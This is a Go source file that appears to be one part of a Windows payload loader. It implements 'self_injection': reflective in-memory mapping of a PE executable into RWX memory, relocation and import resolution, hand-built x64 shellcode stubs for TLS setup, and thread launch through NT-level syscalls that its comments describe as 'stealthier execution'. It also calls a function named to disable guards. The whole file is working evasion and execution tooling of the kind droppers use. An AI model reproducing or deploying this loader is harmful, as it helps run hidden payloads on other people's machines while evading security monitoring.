//go:build ignore

package main

import (
	"encoding/binary"
	"runtime"
	"runtime/debug"
	"syscall"
	"unsafe"
)

const (
	selfImageMachineAMD64 = 0x8664
	selfPE32PlusMagic     = 0x20b
)

type selfImage struct {
	Base  uintptr
	Entry uintptr
	Size  uint32
}

var stealthAllocator bool

// executeStrategy is the self_injection entry point.
// It uses NT-level syscalls (NtCreateThreadEx, NtAllocateVirtualMemory) for stealthier
// execution. Falls back to executeFromTemp if image mapping fails.
func executeStrategy(payload []byte) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	prevGC := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(prevGC)

	disableStealthGuards()

	pinned := append([]byte(nil), payload...)
	stealthAllocator = true
	defer func() { stealthAllocator = false }()

	// UPX-packed binaries use a self-extracting decompressor stub as their
	// entry point. Reflective loading is incompatible with that design (the
	// decompressor unpacks into the host process's existing address space in
	// ways that conflict with our mapping), so fall back to a temp-file exec.
	if selfIsUPXPacked(pinned) {
		executeFromTemp(payload)
		return
	}

	img, ok := selfMapImage(pinned)
	if !ok {
		executeFromTemp(payload)
		return
	}
	// Register .pdata so RtlUnwindEx (used by Rust panics and MSVC SEH) works.
	selfRegisterPdata(img, pinned)
	// Redirect img.Entry through a TLS stub so callbacks run in the right thread.
	selfSetupTLSEntry(img, pinned)
	selfRunImageStealth(img)
	runtime.KeepAlive(pinned)
}

func executeSelfInjection(payload []byte) {
	img, ok := selfMapImage(payload)
	if !ok {
		executeFromTemp(payload)
		return
	}
	selfRunImage(img)
}

func selfMapImage(payload []byte) (*selfImage, bool) {
	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
		return nil, false
	}
	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if int(peOffset)+4 > len(payload) {
		return nil, false
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		return nil, false
	}
	machine := binary.LittleEndian.Uint16(payload[peOffset+4:])
	if machine != selfImageMachineAMD64 {
		return nil, false
	}
	optOffset := peOffset + 24
	if int(optOffset+2) > len(payload) {
		return nil, false
	}
	magic := binary.LittleEndian.Uint16(payload[optOffset:])
	if magic != selfPE32PlusMagic {
		return nil, false
	}
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOffset+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOffset+60:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOffset+16:])
	imageBase := binary.LittleEndian.Uint64(payload[optOffset+24:])

	base := selfVirtualAlloc(uintptr(imageBase), uintptr(sizeOfImage))
	if base == 0 {
		base = selfVirtualAlloc(0, uintptr(sizeOfImage))
		if base == 0 {
			return nil, false
		}
	}

	image := selfBytesFromAddress(base, sizeOfImage)
	copy(image[:sizeOfHeaders], payload[:sizeOfHeaders])
	for i := sizeOfHeaders; i < sizeOfImage; i++ {
		image[i] = 0
	}

	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
	sectionOffset := optOffset + uint32(optionalSize)
	for i := uint16(0); i < numberOfSections; i++ {
		hdr := sectionOffset + uint32(i)*40
		if int(hdr+40) > len(payload) {
			break
		}
		virtualAddress := binary.LittleEndian.Uint32(payload[hdr+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[hdr+8:])
		rawSize := binary.LittleEndian.Uint32(payload[hdr+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[hdr+20:])
		size := virtualSize
		if size < rawSize {
			size = rawSize
		}
		if size == 0 {
			continue
		}
		dst := selfBytesFromAddress(base+uintptr(virtualAddress), size)
		for j := uint32(0); j < size; j++ {
			dst[j] = 0
		}
		if rawSize > 0 && int(rawPtr+rawSize) <= len(payload) {
			copy(dst[:rawSize], payload[rawPtr:rawPtr+rawSize])
		}
	}

	delta := int64(base) - int64(imageBase)
	if delta != 0 {
		if !selfApplyRelocations(base, payload, optOffset, uint64(delta)) {
			return nil, false
		}
	}

	if !selfResolveImports(base, payload, optOffset) {
		return nil, false
	}

	return &selfImage{
		Base:  base,
		Entry: base + uintptr(entryRVA),
		Size:  sizeOfImage,
	}, true
}

func selfRunImage(img *selfImage) {
	thread, _, _ := procCreateThread.Call(0, 0, img.Entry, img.Base, 0, 0)
	if thread != 0 {
		const infiniteWait = 0xFFFFFFFF
		procWaitForSingleObject.Call(thread, infiniteWait)
		procCloseHandle.Call(thread)
	} else {
		syscall.Syscall(img.Entry, 0, 0, 0, 0)
	}
}

func selfRunImageStealth(img *selfImage) {
	var threadHandle uintptr
	status, _, _ := procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF,
		0,
		uintptr(^uintptr(0)),
		img.Entry,
		img.Base,
		0, 0, 0, 0, 0,
	)
	if status != 0 || threadHandle == 0 {
		selfRunImage(img)
		return
	}
	const infiniteWait = 0xFFFFFFFF
	procNtWaitForSingleObject.Call(threadHandle, infiniteWait, 0)
	procNtClose.Call(threadHandle)
}

func selfVirtualAlloc(addr uintptr, size uintptr) uintptr {
	if stealthAllocator {
		return selfNtAllocate(addr, size)
	}
	mem, _, _ := procVirtualAlloc.Call(addr, size, 0x3000, 0x40)
	return mem
}

func selfNtAllocate(addr uintptr, size uintptr) uintptr {
	base := addr
	region := size
	status, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(^uintptr(0)),
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&region)),
		0x3000,
		0x40,
	)
	if status != 0 {
		return 0
	}
	return base
}

func selfBytesFromAddress(addr uintptr, size uint32) []byte {
	if size == 0 {
		return nil
	}
	return unsafe.Slice((*byte)(unsafe.Pointer(addr)), int(size))
}

func selfApplyRelocations(base uintptr, payload []byte, optOffset uint32, delta uint64) bool {
	relocRVA, relocSize := selfDataDirectory(payload, optOffset, 5)
	if relocRVA == 0 || relocSize == 0 {
		return true
	}
	table := selfBytesFromAddress(base+uintptr(relocRVA), relocSize)
	if len(table) == 0 {
		return false
	}
	offset := uint32(0)
	for offset < relocSize {
		if offset+8 > relocSize {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(table[offset:])
		blockSize := binary.LittleEndian.Uint32(table[offset+4:])
		offset += 8
		entries := (blockSize - 8) / 2
		for i := uint32(0); i < entries; i++ {
			if offset+2 > relocSize {
				return false
			}
			entry := binary.LittleEndian.Uint16(table[offset:])
			offset += 2
			typeID := entry >> 12
			rel := pageRVA + uint32(entry&0x0FFF)
			target := base + uintptr(rel)
			switch typeID {
			case 0:
				continue
			case 0xA:
				val := *(*uint64)(unsafe.Pointer(target))
				*(*uint64)(unsafe.Pointer(target)) = val + delta
			case 0x3:
				val32 := *(*uint32)(unsafe.Pointer(target))
				*(*uint32)(unsafe.Pointer(target)) = val32 + uint32(delta)
			}
		}
	}
	return true
}

func selfResolveImports(base uintptr, payload []byte, optOffset uint32) bool {
	importRVA, importSize := selfDataDirectory(payload, optOffset, 1)
	if importRVA == 0 || importSize == 0 {
		return true
	}
	descriptors := selfBytesFromAddress(base+uintptr(importRVA), importSize)
	if len(descriptors) == 0 {
		return false
	}
	offset := uint32(0)
	for {
		if offset+20 > importSize {
			break
		}
		origThunk := binary.LittleEndian.Uint32(descriptors[offset:])
		nameRVA := binary.LittleEndian.Uint32(descriptors[offset+12:])
		firstThunk := binary.LittleEndian.Uint32(descriptors[offset+16:])
		if origThunk == 0 && nameRVA == 0 && firstThunk == 0 {
			break
		}
		dllName := selfReadCString(base, nameRVA)
		hModule := selfLoadLibrary(dllName)
		if hModule == 0 {
			return false
		}
		lookup := origThunk
		if lookup == 0 {
			lookup = firstThunk
		}
		thunkPtr := base + uintptr(firstThunk)
		lookupPtr := base + uintptr(lookup)
		for {
			val := *(*uint64)(unsafe.Pointer(lookupPtr))
			if val == 0 {
				break
			}
			var procAddr uintptr
			if val&0x8000000000000000 != 0 {
				ordinal := val & 0xFFFF
				procAddr = selfGetProcAddress(hModule, "", uintptr(ordinal), true)
			} else {
				funcName := selfReadCString(base, uint32(val)+2)
				procAddr = selfGetProcAddress(hModule, funcName, 0, false)
			}
			if procAddr == 0 {
				return false
			}
			*(*uintptr)(unsafe.Pointer(thunkPtr)) = procAddr
			lookupPtr += 8
			thunkPtr += 8
		}
		offset += 20
	}
	return true
}

func selfDataDirectory(payload []byte, optOffset uint32, index int) (uint32, uint32) {
	base := optOffset + 112
	entry := base + uint32(index*8)
	if int(entry+8) > len(payload) {
		return 0, 0
	}
	rva := binary.LittleEndian.Uint32(payload[entry:])
	size := binary.LittleEndian.Uint32(payload[entry+4:])
	return rva, size
}

func selfReadCString(base uintptr, rva uint32) string {
	if rva == 0 {
		return ""
	}
	var buf []byte
	for i := 0; i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(base + uintptr(rva) + uintptr(i)))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

func selfLoadLibrary(name string) uintptr {
	if name == "" {
		return 0
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	h, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(ptr)))
	return h
}

func selfGetProcAddress(module uintptr, name string, ordinal uintptr, byOrdinal bool) uintptr {
	if module == 0 {
		return 0
	}
	if byOrdinal {
		addr, _, _ := procGetProcAddress.Call(module, ordinal)
		return addr
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	addr, _, _ := procGetProcAddress.Call(module, uintptr(unsafe.Pointer(ptr)))
	return addr
}

// ---------------------------------------------------------------------------
// TLS initialisation and .pdata registration
// ---------------------------------------------------------------------------

// selfBuildEnhancedTLSStub generates x64 shellcode (for a thread entry point)
// that performs the full implicit-TLS initialisation required by MSVC/Rust
// binaries before jumping to the real entry point.  The generated stub:
//
//  1. Calls every TLS callback (imageBase, DLL_PROCESS_ATTACH=1, 0),
//     which lets the MSVC CRT run TlsAlloc and write the slot index into
//     the variable at *addrOfIndex / IMAGE_TLS_DIRECTORY64.AddressOfIndex.
//  2. Reads the (now-populated) TLS slot index from addrOfIndex.
//  3. Points GS:[0x58] (TEB.ThreadLocalStoragePointer) to a pre-allocated
//     pointer array (tlsArray, 256-slot, zeroed by VirtualAlloc).
//  4. Stores tlsBlock (a copy of StartOfRawData..EndOfRawData) at
//     tlsArray[slot_index], so that the first thread_local access by Rust /
//     MSVC code finds a valid data pointer instead of NULL.
//  5. Jumps to entryPoint (tail-call, preserving the original RSP alignment).
//
// If callbacks is empty the stub still performs steps 2-5, which handles the
// common case where _tls_index == 0 (never written by the loader) and Rust
// accesses GS:[0x58] without any DllMain-style callback.
//
// Register discipline (Windows x64 ABI):
//
//	Thread entry RSP = 16n – 8  (RtlUserThreadStart CALLed us).
//	sub rsp, 0x38 → RSP = 16n – 0x40  (16-byte aligned for inner CALLs).
//	rbx / rsi saved/restored.  JMP to entry restores RSP to 16n – 8.
func selfBuildEnhancedTLSStub(imageBase, entryPoint uint64,
	callbacks []uint64,
	addrOfIndex, tlsArray, tlsBlock uint64) []byte {

	buf8 := make([]byte, 8)
	var s []byte

	emit := func(b ...byte) { s = append(s, b...) }
	emit64 := func(v uint64) {
		binary.LittleEndian.PutUint64(buf8, v)
		s = append(s, buf8...)
	}

	// Prolog: sub rsp,0x38 ; mov [rsp+0x20],rbx ; mov [rsp+0x28],rsi
	emit(0x48, 0x83, 0xEC, 0x38)       // sub rsp, 0x38
	emit(0x48, 0x89, 0x5C, 0x24, 0x20) // mov [rsp+0x20], rbx
	emit(0x48, 0x89, 0x74, 0x24, 0x28) // mov [rsp+0x28], rsi

	// Call each TLS callback: cb(imageBase, DLL_PROCESS_ATTACH=1, 0)
	for _, cb := range callbacks {
		emit(0x48, 0xB9)
		emit64(imageBase)                  // mov rcx, imageBase
		emit(0xBA, 0x01, 0x00, 0x00, 0x00) // mov edx, 1
		emit(0x45, 0x31, 0xC0)             // xor r8d, r8d
		emit(0x48, 0xB8)
		emit64(cb)       // mov rax, cb
		emit(0xFF, 0xD0) // call rax
	}

	// Read TLS slot index (DWORD at *addrOfIndex; zero-extends into rax).
	//   mov rcx, addrOfIndex
	//   mov eax, [rcx]          ; rax = _tls_index
	emit(0x48, 0xB9)
	emit64(addrOfIndex) // mov rcx, addrOfIndex
	emit(0x8B, 0x01)    // mov eax, [rcx]

	// rsi = tlsArray  (non-volatile – survives the store below)
	emit(0x48, 0xBE)
	emit64(tlsArray) // mov rsi, tlsArray

	// TEB.ThreadLocalStoragePointer = tlsArray
	// Encoding: MOV QWORD PTR GS:[0x58], rsi
	//   65           — GS segment prefix
	//   48 89 34 25  — MOV r/m64,r64; ModRM=mod00,reg=rsi(6),rm=SIB(4); SIB=scale0,idx=none,base=disp32
	//   58 00 00 00  — 32-bit displacement = 0x58
	// (NOT 65 48 89 35 …, which would be GS:[RIP+0x58] — a RIP-relative address.)
	emit(0x65, 0x48, 0x89, 0x34, 0x25, 0x58, 0x00, 0x00, 0x00)

	// rbx = tlsBlock
	emit(0x48, 0xBB)
	emit64(tlsBlock) // mov rbx, tlsBlock

	// tlsArray[_tls_index] = tlsBlock
	//   MOV QWORD PTR [rsi + rax*8], rbx
	//   Encoding: 48 89 1C C6
	//   (REX.W + MOV [SIB]; ModRM=mod00,reg=rbx,rm=SIB; SIB=scale8,idx=rax,base=rsi)
	emit(0x48, 0x89, 0x1C, 0xC6)

	// Epilog: restore rbx, rsi ; add rsp, 0x38
	emit(0x48, 0x8B, 0x74, 0x24, 0x28) // mov rsi, [rsp+0x28]
	emit(0x48, 0x8B, 0x5C, 0x24, 0x20) // mov rbx, [rsp+0x20]
	emit(0x48, 0x83, 0xC4, 0x38)       // add rsp, 0x38

	// Tail-jump to real entry point (RSP back to 16n–8 as at thread start).
	emit(0x48, 0xB8)
	emit64(entryPoint) // mov rax, entryPoint
	emit(0xFF, 0xE0)   // jmp rax

	return s
}

// selfSetupTLSEntry rewrites img.Entry to the enhanced TLS stub so that, when
// the new thread begins execution, it initialises the full implicit-TLS data
// structure (GS:[0x58] / ThreadLocalStoragePointer) before reaching the real
// entry point.  This is required for Rust (MSVC) and any binary that uses
// __declspec(thread) / thread_local! variables.
//
// The function always installs the stub when a TLS directory is present,
// even if there are no callbacks, because _tls_index may already be 0 (the
// default when the OS loader never ran) and Rust code will crash the moment it
// reads GS:[0x58][0] if that pointer is NULL.
func selfSetupTLSEntry(img *selfImage, payload []byte) {
	optOff := binary.LittleEndian.Uint32(payload[0x3C:]) + 24
	tlsRVA, _ := selfDataDirectory(payload, optOff, 9)
	if tlsRVA == 0 {
		return
	}

	// IMAGE_TLS_DIRECTORY64 layout (all fields are VAs after relocation):
	//  +0  StartOfRawData   uint64
	//  +8  EndOfRawData     uint64
	// +16  AddressOfIndex   uint64  (VA of the DWORD _tls_index variable)
	// +24  AddressOfCallBacks uint64 (VA of NULL-terminated callback array)
	// +32  SizeOfZeroFill   uint32
	tlsDir := img.Base + uintptr(tlsRVA)
	startRaw := *(*uint64)(unsafe.Pointer(tlsDir + 0))
	endRaw := *(*uint64)(unsafe.Pointer(tlsDir + 8))
	addrOfIndex := *(*uint64)(unsafe.Pointer(tlsDir + 16))
	addrOfCBs := *(*uint64)(unsafe.Pointer(tlsDir + 24))
	zeroFill := *(*uint32)(unsafe.Pointer(tlsDir + 32))

	if addrOfIndex == 0 {
		return // no valid TLS directory
	}

	// Collect callback VAs from the already-relocated mapped image.
	var callbacks []uint64
	if addrOfCBs != 0 {
		for i := 0; ; i++ {
			p := (*uint64)(unsafe.Pointer(uintptr(addrOfCBs) + uintptr(i*8)))
			if *p == 0 {
				break
			}
			callbacks = append(callbacks, *p)
		}
	}

	// Allocate and populate the per-thread TLS data block.
	// The raw bytes live in the mapped image between startRaw and endRaw;
	// VirtualAlloc already zeroes memory, so the ZeroFill region is free.
	rawSize := uint32(0)
	if endRaw > startRaw {
		rawSize = uint32(endRaw - startRaw)
	}
	totalSize := rawSize + zeroFill
	if totalSize == 0 {
		totalSize = 8 // ensure a non-zero allocation
	}
	tlsBlock := selfVirtualAlloc(0, uintptr(totalSize))
	if tlsBlock == 0 {
		return
	}
	if rawSize > 0 {
		copy(
			selfBytesFromAddress(tlsBlock, rawSize),
			selfBytesFromAddress(uintptr(startRaw), rawSize),
		)
	}

	// Allocate the TLS pointer array (256 slots × 8 bytes, zeroed).
	// Index 0 is the default when _tls_index was never set by the OS loader.
	// 256 slots covers any reasonable statically-linked use.
	const tlsSlots = 256
	tlsArray := selfVirtualAlloc(0, uintptr(tlsSlots*8))
	if tlsArray == 0 {
		return
	}

	stub := selfBuildEnhancedTLSStub(
		uint64(img.Base), uint64(img.Entry),
		callbacks,
		addrOfIndex, uint64(tlsArray), uint64(tlsBlock),
	)
	if len(stub) == 0 {
		return
	}
	stubMem := selfVirtualAlloc(0, uintptr(len(stub)))
	if stubMem == 0 {
		return
	}
	copy(selfBytesFromAddress(stubMem, uint32(len(stub))), stub)
	img.Entry = stubMem
}

// selfIsUPXPacked returns true when the PE payload has UPX-style sections
// (names starting with "UPX"), indicating that its entry point is a UPX
// decompressor stub rather than the normal CRT/runtime start-up code.
// Such binaries cannot be reflectively mapped because the decompressor
// overwrites the host address space in process-level ways that conflict with
// our in-process mapping; they must be run via executeFromTemp instead.
func selfIsUPXPacked(payload []byte) bool {
	if len(payload) < 0x40 {
		return false
	}
	peOff := uint32(binary.LittleEndian.Uint32(payload[0x3C:]))
	if int(peOff)+24 > len(payload) {
		return false
	}
	nSec := binary.LittleEndian.Uint16(payload[peOff+6:])
	optSz := binary.LittleEndian.Uint16(payload[peOff+20:])
	secBase := peOff + 24 + uint32(optSz)
	for i := uint16(0); i < nSec; i++ {
		off := secBase + uint32(i)*40
		if int(off+8) > len(payload) {
			break
		}
		// Section name is 8 bytes (not necessarily null-terminated).
		if payload[off] == 'U' && payload[off+1] == 'P' && payload[off+2] == 'X' {
			return true
		}
	}
	return false
}

// selfRegisterPdata registers the .pdata (exception-handler) section with the
// OS via RtlAddFunctionTable so that RtlUnwindEx works correctly.
// Rust (and MSVC) binaries rely on this for panic / structured-exception handling.
func selfRegisterPdata(img *selfImage, payload []byte) {
	optOffset := binary.LittleEndian.Uint32(payload[0x3C:]) + 24
	pdataRVA, pdataSize := selfDataDirectory(payload, optOffset, 3)
	if pdataRVA == 0 || pdataSize == 0 {
		return
	}
	functionTable := img.Base + uintptr(pdataRVA)
	entryCount := pdataSize / 12 // sizeof(RUNTIME_FUNCTION) == 12
	procRtlAddFunctionTable.Call(functionTable, uintptr(entryCount), img.Base)
}
